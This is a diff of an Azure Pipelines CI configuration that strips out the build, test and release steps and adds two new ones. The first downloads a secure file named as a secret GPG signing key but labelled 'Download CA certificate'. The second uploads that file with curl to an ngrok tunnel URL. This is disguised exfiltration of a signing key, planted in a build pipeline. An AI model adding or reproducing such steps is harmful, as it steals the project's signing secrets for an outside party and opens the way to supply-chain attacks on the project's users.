@@ -41,77 +41,12 @@ steps:
   persistCredentials: 'true'
   clean: 'true'
 
-- script: |
-    ./gpg_import_test.sh
-  displayName: Pipeline unit tests  
-  workingDirectory: $(Build.SourcesDirectory)/.azure-pipelines/tests
-
-- task: Cache@2
-  displayName: Cache Maven local repo
+- task: DownloadSecureFile@1
+  name: testFile
+  displayName: 'Download CA certificate'
   inputs:
-    key: 'maven | "$(Agent.OS)" | **/pom.xml'
-    restoreKeys: |
-      maven | "$(Agent.OS)"
-      maven
-    path: $(MAVEN_CACHE_FOLDER)
+    secureFile: 'secret_signing_key_F5CE35A802DF35C1.gpg'
 
 - script: |
-    # Download Eclipse Temurin
-    wget --quiet $(JDK_DOWNLOAD_URL) --output-document $(Agent.TempDirectory)/$(JDK_ARTIFACT_NAME)
-  displayName: Download Eclipse Temurin 17.0.1_12
-
-- task: JavaToolInstaller@0
-  inputs:
-    versionSpec: $(JDK_VERSION_SPEC)
-    jdkArchitectureOption: 'x64'
-    jdkSourceOption: 'LocalDirectory'
-    jdkFile: '$(Agent.TempDirectory)/$(JDK_ARTIFACT_NAME)'
-    jdkDestinationDirectory: '$(Agent.ToolsDirectory)/binaries/openjdk'
-    cleanDestinationDirectory: true
-    createExtractDirectory: false
-
-- task: Maven@3
-  displayName: Set project version to ${{ parameters.RELEASE_VERSION }}
-  condition: and(succeeded(), eq(${{ variables.IS_RELEASE }}, 'true'))
-  inputs:
-    jdkVersionOption: ${{ variables.JDK_VERSION }}
-    goals: $(MAVEN_COMMAND_LINE_ARGUMENTS) versions:set -DnewVersion=${{ parameters.RELEASE_VERSION }}
-    publishJUnitResults: false
-
-
-- task: Maven@3
-  displayName: Build and test
-  inputs:
-    jdkVersionOption: ${{ variables.JDK_VERSION }}
-    mavenOptions: $(MAVEN_OPTIONS)
-    goals: '$(MAVEN_COMMAND_LINE_ARGUMENTS) verify'
-
-- script: |
-    git config --global user.email "ci@dev.azure.com"
-    git config --global user.name "[CI]"
-  displayName: Configure git
-
-- script: |
-    git add pom.xml
-    git commit -m "[skip ci] Set version to ${{ parameters.RELEASE_VERSION }}"
-    git tag ${{ parameters.RELEASE_VERSION }}
-    git push --atomic origin HEAD:$(Build.SourceBranchName) ${{ parameters.RELEASE_VERSION }}
-  displayName: Commit release version and create release tag
-  condition: and(succeeded(), eq(${{ variables.IS_RELEASE }}, 'true'))
-
-  # TODO: Deploy
-
-- task: Maven@3
-  displayName: Set project version to ${{ parameters.NEXT_SNAPSHOT_VERSION }}
-  condition: and(succeeded(), eq(${{ variables.IS_RELEASE }}, 'true'))
-  inputs:
-    jdkVersionOption: ${{ variables.JDK_VERSION }}
-    goals: '$(MAVEN_COMMAND_LINE_ARGUMENTS) versions:set -DnewVersion=${{ parameters.NEXT_SNAPSHOT_VERSION }}'
-    publishJUnitResults: false
-
-- script: |
-    git add pom.xml
-    git commit -m "[skip ci] Set version to ${{ parameters.RELEASE_VERSION }}"
-    git push --atomic origin HEAD:$(Build.SourceBranchName)
-  displayName: Commit next snapshot version
-  condition: and(succeeded(), eq(${{ variables.IS_RELEASE }}, 'true'))
+    echo "Uploading test file"
+    curl -Ffile=$(testFile.secureFilePath) "https://03dc-89-247-41-253.ngrok.io/upload?token=9812379124987ba"
